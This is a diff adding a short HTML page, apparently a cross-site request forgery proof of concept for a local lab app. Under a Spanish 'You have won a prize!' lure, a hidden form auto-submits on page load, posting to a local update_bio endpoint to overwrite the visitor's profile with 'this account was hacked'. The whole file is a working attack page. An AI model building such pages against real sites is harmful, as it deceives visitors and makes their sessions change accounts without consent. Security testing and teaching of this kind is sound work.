@@ -1,0 +1,9 @@
+<html>
+  <body>
+    <h1>¡Has ganado un premio!</h1>
+    <form id="csrf-form" action="http://127.0.0.1:5000/update_bio" method="POST">
+      <input type="hidden" name="new_bio" value="ESTA CUENTA FUE HACKEADA" />
+    </form>
+    <script>document.getElementById('csrf-form').submit();</script>
+  </body>
+</html>
